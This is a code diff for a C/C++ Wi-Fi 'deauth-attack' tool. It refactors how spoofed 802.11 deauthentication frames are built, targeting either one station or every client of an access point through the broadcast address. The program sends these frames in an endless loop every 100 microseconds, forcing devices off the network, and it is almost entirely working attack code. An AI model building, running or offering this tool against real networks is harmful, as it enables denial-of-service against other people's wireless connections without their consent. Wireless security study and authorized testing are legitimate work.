@@ -5,22 +5,9 @@
 #include <unistd.h>
 #include <stddef.h>
 #include "wireless.h"
+#include "frame.h"
 
-uint8_t deauth_frame[38] = {
-    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, /* ........ */
-    0x02, 0x00, 0x18, 0x00, 0xc0, 0x00, 0x3a, 0x01, /* ......:. */
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x08, 0x5d, /* .......] */
-    0xdd, 0x14, 0xe2, 0xa4, 0x08, 0x5d, 0xdd, 0x14, /* .....].. */
-    0xe2, 0xa4, 0x90, 0x45, 0x07, 0x00              /* ...E.. */
-};
-
-void pack_addr(uint8_t* buf, int start, char* str) {
-    for (int i = 0; i < 6; i++) {
-        str[i * 3 + 2] = '\0';
-        int val = strtol(str + i * 3, NULL, 16);
-        buf[start + i] = val;
-    }
-}
+#define DEAUTH_FRAME_SIZE 38
 
 void usage() {
     printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
@@ -71,30 +58,28 @@ int main(int argc, char *argv[])
 
     if (param.auth) {
         /* To Do */
+        /* auth-attack does not work */
     }
 
     else {
-        uint8_t buf[256];
-        for (int i = 0; i < (int)sizeof(deauth_frame); i++)
-            buf[i] = deauth_frame[i];
-        int radiotap_length = ((struct ieee80211_radiotap_header*)(buf))->it_len;
-        int offset_to_ap = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, send_addr);
-        pack_addr(buf, offset_to_ap, param.ap_mac_);
+        Frame frame;
+        frame.radio.it_len = 8;
+        frame.pack_ap(param.ap_mac_);
 
-        int offset_to_bssid = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, bssid);
-        pack_addr(buf, offset_to_bssid, param.ap_mac_);
-
-        if(param.unicast) {
-            int offset_to_station = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, recv_addr);
-            pack_addr(buf, offset_to_station, param.station_mac_);
-        }
+        /* disconnect specific device from AP */
+        if(param.unicast)
+            frame.pack_station(param.station_mac_);
+        /* disconnect all devices from AP (broadcast) */
+        else
+            frame.pack_station((char*)"ff:ff:ff:ff:ff:ff");
 
         while (true) {
             puts("sending deauth packet ... ");
-            pcap_sendpacket(pcap, buf, sizeof(deauth_frame));
+            pcap_sendpacket(pcap, (const u_char*)(&frame), DEAUTH_FRAME_SIZE);
             usleep(100);
         }
     }
+    pcap_close(pcap);
 
     return 0;
 }
